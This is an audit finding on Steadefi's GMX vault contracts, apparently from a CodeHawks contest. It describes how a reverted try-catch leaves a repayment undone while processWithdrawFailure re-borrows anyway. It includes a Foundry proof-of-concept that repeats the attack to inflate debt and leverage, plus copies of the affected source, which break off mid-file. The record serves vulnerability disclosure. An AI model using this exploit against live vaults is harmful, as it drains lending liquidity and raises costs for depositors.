{
  "Title": "try-catch does not store the state when it is reverted",
  "Content": "# try-catch does not store the state when it is reverted\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXWithdraw.sol#L239-L243\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXWithdraw.sol#L239-L243</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXProcessWithdraw.sol#L56C1-L60C7\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXProcessWithdraw.sol#L56C1-L60C7</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXWithdraw.sol#L178C5-L178C51\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXWithdraw.sol#L178C5-L178C51</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXChecks.sol#L224C1-L227C50\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXChecks.sol#L224C1-L227C50</a>\n\n\n## Summary\n\nIf a withdrawal from GMX is successful without any errors, the borrowed amount is repayed to the lending vaults within a try-catch block within the processWithdraw function. Subsequently, the afterWithdrawChecks are performed. If a revert occurs during this step, everything executed within the try-catch block is reseted, and the Vault's status is set to 'Withdraw_Failed.' In such a scenario, a Keeper must call the processWithdrawFailure function. In this case, there is an erroneous attempt to borrow from the LendingVaults again, even though the repayment never actually occurred due to the revert within the try-catch block.\n\n## Vulnerability Details\n\nHere is a POC that demonstrates how a user can exploit this bug by intentionally causing the afterWithdrawChecks to fail, resulting in additional borrowing from the LendingVault in the processWithdrawFailure function.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\nimport { console, console2 } from \"forge-std/Test.sol\";\nimport { TestUtils } from \"../../helpers/TestUtils.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { GMXMockVaultSetup } from \"./GMXMockVaultSetup.t.sol\";\nimport { GMXTypes } from \"../../../contracts/strategy/gmx/GMXTypes.sol\";\nimport { GMXTestHelper } from \"./GMXTestHelper.sol\";\n\nimport { IDeposit } from \"../../../contracts/interfaces/protocols/gmx/IDeposit.sol\";\nimport { IEvent } from \"../../../contracts/interfaces/protocols/gmx/IEvent.sol\";\n\ncontract GMXDepositTest is GMXMockVaultSetup, GMXTestHelper, TestUtils {\n    function test_POC1() public {\n        //Owner deposits 1 ether in vault\n        vm.startPrank(owner);\n        _createDeposit(address(WETH), 1 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n        mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n\n        //User1 deposits 1 ether in vault\n        vm.startPrank(user1);\n        _createDeposit(address(WETH), 1 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n        mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n        \n        //Variables for assertion\n        uint256 leverageBefore = vault.leverage();\n        (,uint256 debtAmtTokenBBefore) = vault.debtAmt();\n\n        uint256 vaultSharesAmount = IERC20(address(vault)).balanceOf(user1);  //Vault shares to withdraw\n        GMXTypes.Store memory _store;\n        for(uint256 i; i < 5; i++) {\n            vm.startPrank(user1);\n            //User1 tries to withdraw all of his deposits and enters an unrealistically high amount as the minWithdrawAmt (10000 ether) to intentionally make the afterWithdrawChecks fail\n            _createAndExecuteWithdrawal(address(WETH), address(USDC), address(USDC), vaultSharesAmount, 10000 ether, SLIPPAGE, EXECUTION_FEE);\n\n            _store = vault.store();\n            assert(uint256(_store.status) == uint256(GMXTypes.Status.Withdraw_Failed)); //Since the afterWithdrawChecks have failed, the Vault status is Withdraw_Failed\n\n            //Keeper calls processWithdrawFailure to deposit the withdrawn tokens back into GMX, mistakenly borrowing something from the LendingVaults in the process.\n            vault.processWithdrawFailure{value: EXECUTION_FEE}(SLIPPAGE, EXECUTION_FEE);\n            mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n            vm.stopPrank();\n        } //The for-loop is there to demonstrate that a user can easily execute the process multiple times to increase \n          //the debt and leverage. (The user can do it as long as the Lending Vaults have liquidity.)\n\n        //Variables for assertion\n        uint256 leverageAfter = vault.leverage();\n        (,uint256 debtAmtTokenBAfter) = vault.debtAmt();\n\n        //Shows that after the failed withdrawal process, debt and leverage are higher. (Token A is irrelevant as Delta is Long)\n        assert(debtAmtTokenBAfter > debtAmtTokenBBefore);\n        assert(leverageAfter > leverageBefore);\n\n        console.log(\"DebtAmtBefore: %s\", debtAmtTokenBBefore);\n        console.log(\"DebtAmtAfter: %s\", debtAmtTokenBAfter);\n        console.log(\"leverageBefore: %s\", leverageBefore);\n        console.log(\"leverageAfter: %s\", leverageAfter);\n    }\n}\n```\n\nThe PoC can be started with this command: `forge test --match-test test_POC1 -vv`\n\n## Impact\n\nUsers can intentionally deplete the capacity of a lending vault to increase the leverage of a vault. This also results in lending vaults having no capacity left for new deposits. As a result, the utilization rate increases significantly, leading to higher borrowing costs.\n\n## Tools Used\n\nVSCode, Foundry\n\n## Recommendations\n\nIn processWithdrawFailure, no more borrowing should occur:\n\n```solidity\nFile: contracts/strategy/gmx/GMXWithdraw.sol#processWithdrawFailure\n239: GMXManager.borrow(\n240:       self,\n241:       self.withdrawCache.repayParams.repayTokenAAmt,\n242:       self.withdrawCache.repayParams.repayTokenBAmt\n243: );\n```\n\nThese lines of code should be deleted",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clo38mm260001la08daw5cbuf",
  "Code": [
    {
      "filename": "contracts/strategy/gmx/GMXWithdraw.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\nimport { GMXChecks } from \"./GMXChecks.sol\";\nimport { GMXManager } from \"./GMXManager.sol\";\nimport { GMXProcessWithdraw } from \"./GMXProcessWithdraw.sol\";\n\n/**\n  * @title GMXWithdraw\n  * @author Steadefi\n  * @notice Re-usable library functions for withdraw operations for Steadefi leveraged vaults\n*/\nlibrary GMXWithdraw {\n  using SafeERC20 for IERC20;\n\n  /* ====================== CONSTANTS ======================== */\n\n  uint256 public constant SAFE_MULTIPLIER = 1e18;\n\n  /* ======================== EVENTS ========================= */\n\n  event WithdrawCreated(address indexed user, uint256 shareAmt);\n  event WithdrawCompleted(\n    address indexed user,\n    address token,\n    uint256 tokenAmt\n  );\n  event WithdrawCancelled(address indexed user);\n  event WithdrawFailed(bytes reason);\n\n  /* ================== MUTATIVE FUNCTIONS =================== */\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function withdraw(\n    GMXTypes.Store storage self,\n    GMXTypes.WithdrawParams memory wp\n  ) external {\n    // Sweep any tokenA/B in vault to the temporary trove for future compouding and to prevent\n    // it from being considered as part of withdrawers assets\n    if (self.tokenA.balanceOf(address(this)) > 0) {\n      self.tokenA.safeTransfer(self.trove, self.tokenA.balanceOf(address(this)));\n    }\n    if (self.tokenB.balanceOf(address(this)) > 0) {\n      self.tokenB.safeTransfer(self.trove, self.tokenB.balanceOf(address(this)));\n    }\n\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.HealthParams memory _hp;\n\n    _hp.equityBefore = GMXReader.equityValue(self);\n    _hp.lpAmtBefore = GMXReader.lpAmt(self);\n    _hp.debtRatioBefore = GMXReader.debtRatio(self);\n    _hp.deltaBefore = GMXReader.delta(self);\n\n    GMXTypes.WithdrawCache memory _wc;\n\n    _wc.user = payable(msg.sender);\n\n    _wc.shareRatio = wp.shareAmt\n      * SAFE_MULTIPLIER\n      / IERC20(address(self.vault)).totalSupply();\n    _wc.lpAmt = _wc.shareRatio\n      * GMXReader.lpAmt(self)\n      / SAFE_MULTIPLIER;\n    _wc.withdrawValue = _wc.lpAmt\n      * self.gmxOracle.getLpTokenValue(\n        address(self.lpToken),\n        address(self.tokenA),\n        address(self.tokenA),\n        address(self.tokenB),\n        false,\n        false\n      )\n      / SAFE_MULTIPLIER;\n\n    _wc.withdrawParams = wp;\n    _wc.healthParams = _hp;\n\n    (\n      uint256 _repayTokenAAmt,\n      uint256 _repayTokenBAmt\n    ) = GMXManager.calcRepay(self, _wc.shareRatio);\n\n    _wc.repayParams.repayTokenAAmt = _repayTokenAAmt;\n    _wc.repayParams.repayTokenBAmt = _repayTokenBAmt;\n\n    self.withdrawCache = _wc;\n\n    GMXChecks.beforeWithdrawChecks(self);\n\n    self.status = GMXTypes.Status.Withdraw;\n\n    self.vault.mintFee();\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    // If user wants to withdraw LP tokens, only remove liquidity of\n    // LP tokens that are proportionately borrowed to repay debt\n    // If not, we just remove all LP tokens computed in _wc.lpAmt\n    if (wp.token == address(self.lpToken)) {\n      // LP amount to be removed for leverage debt repayment\n      // Multiply LP amt to remove by 2% to account for price differential,\n      // fees on LP removal, slippages to ensure payment of debt is covered\n      // Excess tokenA/B will be returned to the user regardless\n      uint256 _lpAmtToRemove = _wc.lpAmt\n        * (self.leverage - SAFE_MULTIPLIER)\n        / self.leverage\n        * 10200 / 10000;\n\n      _wc.tokensToUser = _wc.lpAmt - _lpAmtToRemove;\n      _wc.lpAmt = _lpAmtToRemove;\n    }\n\n\n    // If delta strategy is Long, remove all in tokenB to make it more\n    // efficent to repay tokenB debt as Long strategy only borrows tokenB\n    if (self.delta == GMXTypes.Delta.Long) {\n      address[] memory _tokenASwapPath = new address[](1);\n      _tokenASwapPath[0] = address(self.lpToken);\n      _rlp.tokenASwapPath = _tokenASwapPath;\n\n      (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n        self,\n        _wc.lpAmt,\n        address(self.tokenB),\n        address(self.tokenB),\n        wp.slippage\n      );\n    } else {\n      (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n        self,\n        _wc.lpAmt,\n        address(self.tokenA),\n        address(self.tokenB),\n        wp.slippage\n      );\n    }\n\n    _rlp.lpAmt = _wc.lpAmt;\n    _rlp.executionFee = wp.executionFee;\n\n    _wc.withdrawKey = GMXManager.removeLiquidity(\n      self,\n      _rlp\n    );\n\n    // Add withdrawKey to store\n    self.withdrawCache = _wc;\n\n    emit WithdrawCreated(\n      _wc.user,\n      _wc.withdrawParams.shareAmt\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdraw(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessWithdrawChecks(self);\n\n    // We transfer the core logic of this function to GMXProcessWithdraw.processWithdraw()\n    // to allow try/catch here to catch for any issues such as any token swaps failing or\n    // debt repayment failing, or any checks in afterWithdrawChecks() failing.\n    // If there are any issues, a WithdrawFailed event will be emitted and processWithdrawFailure()\n    // should be triggered to refund assets accordingly and reset the vault status to Open again.\n    try GMXProcessWithdraw.processWithdraw(self) {\n      // If native token is being withdrawn, we convert wrapped to native\n      if (self.withdrawCache.withdrawParams.token == address(self.WNT)) {\n        self.WNT.withdraw(self.withdrawCache.tokensToUser);\n        (bool success, ) = self.withdrawCache.user.call{value: address(this).balance}(\"\");\n        require(success, \"Transfer failed.\");\n      } else {\n        // Transfer requested withdraw asset to user\n        IERC20(self.withdrawCache.withdrawParams.token).safeTransfer(\n          self.withdrawCache.user,\n          self.withdrawCache.tokensToUser\n        );\n      }\n\n      // Transfer any remaining tokenA/B that was unused (due to slippage) to user as well\n      self.tokenA.safeTransfer(self.withdrawCache.user, self.tokenA.balanceOf(address(this)));\n      self.tokenB.safeTransfer(self.withdrawCache.user, self.tokenB.balanceOf(address(this)));\n\n      // Burn user shares\n      self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);\n\n      self.status = GMXTypes.Status.Open;\n\n      emit WithdrawCompleted(\n        self.withdrawCache.user,\n        self.withdrawCache.withdrawParams.token,\n        self.withdrawCache.tokensToUser\n      );\n    } catch (bytes memory reason) {\n      self.status = GMXTypes.Status.Withdraw_Failed;\n\n      emit WithdrawFailed(reason);\n    }\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawCancellation(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessWithdrawCancellationChecks(self);\n\n    self.status = GMXTypes.Status.Open;\n\n    emit WithdrawCancelled(self.withdrawCache.user);\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawFailure(\n    GMXTypes.Store storage self,\n    uint256 slippage,\n    uint256 executionFee\n  ) external {\n    GMXChecks.beforeProcessAfterWithdrawFailureChecks(self);\n\n    // Re-borrow assets based on the repaid amount\n    GMXManager.borrow(\n      self,\n      self.withdrawCache.repayParams.repayTokenAAmt,\n      self.withdrawCache.repayParams.repayTokenBAmt\n    );\n\n    // Re-add liquidity using all available tokenA/B in vault\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n\n    // Calculate slippage\n    uint256 _depositValue = GMXReader.convertToUsdValue(\n      self,\n      address(self.tokenA),\n      self.tokenA.balanceOf(address(this))\n    )\n    + GMXReader.convertToUsdValue(\n      self,\n      address(self.tokenB),\n      self.tokenB.balanceOf(address(this))\n    );\n\n    _alp.minMarketTokenAmt = GMXManager.calcMinMarketSlippageAmt(\n      self,\n      _depositValue,\n      slippage\n    );\n    _alp.executionFee = executionFee;\n\n    // Re-add liquidity with all tokenA/tokenB in vault\n    self.withdrawCache.depositKey = GMXManager.addLiquidity(\n      self,\n      _alp\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawFailureLiquidityAdded(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessAfterWithdrawFailureLiquidityAdded(self);\n\n    self.status = GMXTypes.Status.Open;\n  }\n}"
    },
    {
      "filename": "contracts/strategy/gmx/GMXProcessWithdraw.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ISwap } from  \"../../interfaces/swap/ISwap.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\nimport { GMXChecks } from \"./GMXChecks.sol\";\nimport { GMXManager } from \"./GMXManager.sol\";\n\n/**\n  * @title GMXProcessWithdraw\n  * @author Steadefi\n  * @notice Re-usable library functions for process withdraw operations for Steadefi leveraged vaults\n*/\nlibrary GMXProcessWithdraw {\n\n  /* ================== MUTATIVE FUNCTIONS =================== */\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdraw(\n    GMXTypes.Store storage self\n  ) external {\n    // Check if swap between assets are needed for repayment\n    (\n      bool _swapNeeded,\n      address _tokenFrom,\n      address _tokenTo,\n      uint256 _tokenToAmt\n    ) = GMXManager.calcSwapForRepay(self, self.withdrawCache.repayParams);\n\n    if (_swapNeeded) {\n      ISwap.SwapParams memory _sp;\n\n      _sp.tokenIn = _tokenFrom;\n      _sp.tokenOut = _tokenTo;\n      _sp.amountIn = IERC20(_tokenFrom).balanceOf(address(this));\n      _sp.amountOut = _tokenToAmt;\n      _sp.slippage = self.minSlippage;\n      _sp.deadline = block.timestamp;\n      // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n      // We allow deadline to be set as the current block timestamp whenever this function\n      // is called because this function is triggered as a follow up function (by a callback/keeper)\n      // and not directly by a user/keeper. If this follow on function flow reverts due to this tx\n      // being processed after a set deadline, this will cause the vault to be in a \"stuck\" state.\n      // To resolve this, this function will have to be called again with an updated deadline until it\n      // succeeds/a miner processes the tx.\n\n      GMXManager.swapTokensForExactTokens(self, _sp);\n    }\n\n    // Repay debt\n    GMXManager.repay(\n      self,\n      self.withdrawCache.repayParams.repayTokenAAmt,\n      self.withdrawCache.repayParams.repayTokenBAmt\n    );\n\n    // At this point, the LP has been removed for assets for repayment hence\n    // equityValue should be less than before. Note that if user wants to withdraw\n    // in LP token, the equityValue here should still be less than before as a portion\n    // of LP will still have been withdrawn for assets for debt repayment\n    self.withdrawCache.healthParams.equityAfter = GMXReader.equityValue(self);\n\n    // If user wants to withdraw in tokenA/B, swap tokens accordingly and update tokensToUser\n    // Else if user wants to withdraw in LP token, the tokensToUser is already previously\n    // set in GMXWithdraw.withdraw()\n    if (\n      self.withdrawCache.withdrawParams.token == address(self.tokenA) ||\n      self.withdrawCache.withdrawParams.token == address(self.tokenB)\n    ) {\n      ISwap.SwapParams memory _sp;\n\n      if (self.withdrawCache.withdrawParams.token == address(self.tokenA)) {\n        _sp.tokenIn = address(self.tokenB);\n        _sp.tokenOut = address(self.tokenA);\n        _sp.amountIn = self.tokenB.balanceOf(address(this));\n      }\n\n      if (self.withdrawCache.withdrawParams.token == address(self.tokenB)) {\n        _sp.tokenIn = address(self.tokenA);\n        _sp.tokenOut = address(self.tokenB);\n        _sp.amountIn = self.tokenA.balanceOf(address(this));\n      }\n\n      _sp.slippage = self.minSlippage;\n      _sp.deadline = block.timestamp;\n      // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n      // We allow deadline to be set as the current block timestamp whenever this function\n      // is called because this function is triggered as a follow up function (by a callback/keeper)\n      // and not directly by a user/keeper. If this follow on function flow reverts due to this tx\n      // being processed after a set deadline, this will cause the vault to be in a \"stuck\" state.\n      // To resolve this, this function will have to be called again with an updated deadline until it\n      // succeeds/a miner processes the tx.\n\n      GMXManager.swapExactTokensForTokens(self, _sp);\n\n      self.withdrawCache.tokensToUser =\n        IERC20(self.withdrawCache.withdrawParams.token).balanceOf(address(this));\n\n      GMXChecks.afterWithdrawChecks(self);\n    }\n  }\n}"
    },
    {
      "filename": "contracts/strategy/gmx/GMXWithdraw.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\nimport { GMXChecks } from \"./GMXChecks.sol\";\nimport { GMXManager } from \"./GMXManager.sol\";\nimport { GMXProcessWithdraw } from \"./GMXProcessWithdraw.sol\";\n\n/**\n  * @title GMXWithdraw\n  * @author Steadefi\n  * @notice Re-usable library functions for withdraw operations for Steadefi leveraged vaults\n*/\nlibrary GMXWithdraw {\n  using SafeERC20 for IERC20;\n\n  /* ====================== CONSTANTS ======================== */\n\n  uint256 public constant SAFE_MULTIPLIER = 1e18;\n\n  /* ======================== EVENTS ========================= */\n\n  event WithdrawCreated(address indexed user, uint256 shareAmt);\n  event WithdrawCompleted(\n    address indexed user,\n    address token,\n    uint256 tokenAmt\n  );\n  event WithdrawCancelled(address indexed user);\n  event WithdrawFailed(bytes reason);\n\n  /* ================== MUTATIVE FUNCTIONS =================== */\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function withdraw(\n    GMXTypes.Store storage self,\n    GMXTypes.WithdrawParams memory wp\n  ) external {\n    // Sweep any tokenA/B in vault to the temporary trove for future compouding and to prevent\n    // it from being considered as part of withdrawers assets\n    if (self.tokenA.balanceOf(address(this)) > 0) {\n      self.tokenA.safeTransfer(self.trove, self.tokenA.balanceOf(address(this)));\n    }\n    if (self.tokenB.balanceOf(address(this)) > 0) {\n      self.tokenB.safeTransfer(self.trove, self.tokenB.balanceOf(address(this)));\n    }\n\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.HealthParams memory _hp;\n\n    _hp.equityBefore = GMXReader.equityValue(self);\n    _hp.lpAmtBefore = GMXReader.lpAmt(self);\n    _hp.debtRatioBefore = GMXReader.debtRatio(self);\n    _hp.deltaBefore = GMXReader.delta(self);\n\n    GMXTypes.WithdrawCache memory _wc;\n\n    _wc.user = payable(msg.sender);\n\n    _wc.shareRatio = wp.shareAmt\n      * SAFE_MULTIPLIER\n      / IERC20(address(self.vault)).totalSupply();\n    _wc.lpAmt = _wc.shareRatio\n      * GMXReader.lpAmt(self)\n      / SAFE_MULTIPLIER;\n    _wc.withdrawValue = _wc.lpAmt\n      * self.gmxOracle.getLpTokenValue(\n        address(self.lpToken),\n        address(self.tokenA),\n        address(self.tokenA),\n        address(self.tokenB),\n        false,\n        false\n      )\n      / SAFE_MULTIPLIER;\n\n    _wc.withdrawParams = wp;\n    _wc.healthParams = _hp;\n\n    (\n      uint256 _repayTokenAAmt,\n      uint256 _repayTokenBAmt\n    ) = GMXManager.calcRepay(self, _wc.shareRatio);\n\n    _wc.repayParams.repayTokenAAmt = _repayTokenAAmt;\n    _wc.repayParams.repayTokenBAmt = _repayTokenBAmt;\n\n    self.withdrawCache = _wc;\n\n    GMXChecks.beforeWithdrawChecks(self);\n\n    self.status = GMXTypes.Status.Withdraw;\n\n    self.vault.mintFee();\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    // If user wants to withdraw LP tokens, only remove liquidity of\n    // LP tokens that are proportionately borrowed to repay debt\n    // If not, we just remove all LP tokens computed in _wc.lpAmt\n    if (wp.token == address(self.lpToken)) {\n      // LP amount to be removed for leverage debt repayment\n      // Multiply LP amt to remove by 2% to account for price differential,\n      // fees on LP removal, slippages to ensure payment of debt is covered\n      // Excess tokenA/B will be returned to the user regardless\n      uint256 _lpAmtToRemove = _wc.lpAmt\n        * (self.leverage - SAFE_MULTIPLIER)\n        / self.leverage\n        * 10200 / 10000;\n\n      _wc.tokensToUser = _wc.lpAmt - _lpAmtToRemove;\n      _wc.lpAmt = _lpAmtToRemove;\n    }\n\n\n    // If delta strategy is Long, remove all in tokenB to make it more\n    // efficent to repay tokenB debt as Long strategy only borrows tokenB\n    if (self.delta == GMXTypes.Delta.Long) {\n      address[] memory _tokenASwapPath = new address[](1);\n      _tokenASwapPath[0] = address(self.lpToken);\n      _rlp.tokenASwapPath = _tokenASwapPath;\n\n      (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n        self,\n        _wc.lpAmt,\n        address(self.tokenB),\n        address(self.tokenB),\n        wp.slippage\n      );\n    } else {\n      (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n        self,\n        _wc.lpAmt,\n        address(self.tokenA),\n        address(self.tokenB),\n        wp.slippage\n      );\n    }\n\n    _rlp.lpAmt = _wc.lpAmt;\n    _rlp.executionFee = wp.executionFee;\n\n    _wc.withdrawKey = GMXManager.removeLiquidity(\n      self,\n      _rlp\n    );\n\n    // Add withdrawKey to store\n    self.withdrawCache = _wc;\n\n    emit WithdrawCreated(\n      _wc.user,\n      _wc.withdrawParams.shareAmt\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdraw(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessWithdrawChecks(self);\n\n    // We transfer the core logic of this function to GMXProcessWithdraw.processWithdraw()\n    // to allow try/catch here to catch for any issues such as any token swaps failing or\n    // debt repayment failing, or any checks in afterWithdrawChecks() failing.\n    // If there are any issues, a WithdrawFailed event will be emitted and processWithdrawFailure()\n    // should be triggered to refund assets accordingly and reset the vault status to Open again.\n    try GMXProcessWithdraw.processWithdraw(self) {\n      // If native token is being withdrawn, we convert wrapped to native\n      if (self.withdrawCache.withdrawParams.token == address(self.WNT)) {\n        self.WNT.withdraw(self.withdrawCache.tokensToUser);\n        (bool success, ) = self.withdrawCache.user.call{value: address(this).balance}(\"\");\n        require(success, \"Transfer failed.\");\n      } else {\n        // Transfer requested withdraw asset to user\n        IERC20(self.withdrawCache.withdrawParams.token).safeTransfer(\n          self.withdrawCache.user,\n          self.withdrawCache.tokensToUser\n        );\n      }\n\n      // Transfer any remaining tokenA/B that was unused (due to slippage) to user as well\n      self.tokenA.safeTransfer(self.withdrawCache.user, self.tokenA.balanceOf(address(this)));\n      self.tokenB.safeTransfer(self.withdrawCache.user, self.tokenB.balanceOf(address(this)));\n\n      // Burn user shares\n      self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);\n\n      self.status = GMXTypes.Status.Open;\n\n      emit WithdrawCompleted(\n        self.withdrawCache.user,\n        self.withdrawCache.withdrawParams.token,\n        self.withdrawCache.tokensToUser\n      );\n    } catch (bytes memory reason) {\n      self.status = GMXTypes.Status.Withdraw_Failed;\n\n      emit WithdrawFailed(reason);\n    }\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawCancellation(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessWithdrawCancellationChecks(self);\n\n    self.status = GMXTypes.Status.Open;\n\n    emit WithdrawCancelled(self.withdrawCache.user);\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawFailure(\n    GMXTypes.Store storage self,\n    uint256 slippage,\n    uint256 executionFee\n  ) external {\n    GMXChecks.beforeProcessAfterWithdrawFailureChecks(self);\n\n    // Re-borrow assets based on the repaid amount\n    GMXManager.borrow(\n      self,\n      self.withdrawCache.repayParams.repayTokenAAmt,\n      self.withdrawCache.repayParams.repayTokenBAmt\n    );\n\n    // Re-add liquidity using all available tokenA/B in vault\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n\n    // Calculate slippage\n    uint256 _depositValue = GMXReader.convertToUsdValue(\n      self,\n      address(self.tokenA),\n      self.tokenA.balanceOf(address(this))\n    )\n    + GMXReader.convertToUsdValue(\n      self,\n      address(self.tokenB),\n      self.tokenB.balanceOf(address(this))\n    );\n\n    _alp.minMarketTokenAmt = GMXManager.calcMinMarketSlippageAmt(\n      self,\n      _depositValue,\n      slippage\n    );\n    _alp.executionFee = executionFee;\n\n    // Re-add liquidity with all tokenA/tokenB in vault\n    self.withdrawCache.depositKey = GMXManager.addLiquidity(\n      self,\n      _alp\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawFailureLiquidityAdded(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessAfterWithdrawFailureLiquidityAdded(self);\n\n    self.status = GMXTypes.Status.Open;\n  }\n}"
    },
    {
      "filename": "contracts/strategy/gmx/GMXChecks.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { IDeposit } from \"../../interfaces/protocols/gmx/IDeposit.sol\";\nimport { IWithdrawal } from \"../../interfaces/protocols/gmx/IWithdrawal.sol\";\nimport { IEvent } from \"../../interfaces/protocols/gmx/IEvent.sol\";\nimport { IOrder } from \"../../interfaces/protocols/gmx/IOrder.sol\";\nimport { Errors } from \"../../utils/Errors.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\n\n/**\n  * @title GMXChecks\n  * @author Steadefi\n  * @notice Re-usable library functions for require function checks for Steadefi leveraged vaults\n*/\nlibrary GMXChecks {\n\n  /* ====================== CONSTANTS ======================== */\n\n  uint256 public constant SAFE_MULTIPLIER = 1e18;\n  uint256 public constant MINIMUM_VALUE = 9e16;\n\n  /* ===================== VIEW FUNCTIONS ==================== */\n\n  /**\n    * @notice Checks before native token deposit\n    * @param self GMXTypes.Store\n    * @param dp GMXTypes.DepositParams\n  */\n  function beforeNativeDepositChecks(\n    GMXTypes.Store storage self,\n    GMXTypes.DepositParams memory dp\n  ) external view {\n    if (dp.token != address(self.WNT))\n      revert Errors.InvalidNativeTokenAddress();\n\n    if (\n      address(self.tokenA) != address(self.WNT) &&\n      address(self.tokenB) != address(self.WNT)\n    ) revert Errors.OnlyNonNativeDepositToken();\n\n    if (dp.amt == 0) revert Errors.EmptyDepositAmount();\n\n    if (dp.amt + dp.executionFee != msg.value)\n      revert Errors.DepositAndExecutionFeeDoesNotMatchMsgValue();\n  }\n\n  /**\n    * @notice Checks before token deposit\n    * @param self GMXTypes.Store\n    * @param depositValue USD value in 1e18\n  */\n  function beforeDepositChecks(\n    GMXTypes.Store storage self,\n    uint256 depositValue\n  ) external view {\n    if (self.status != 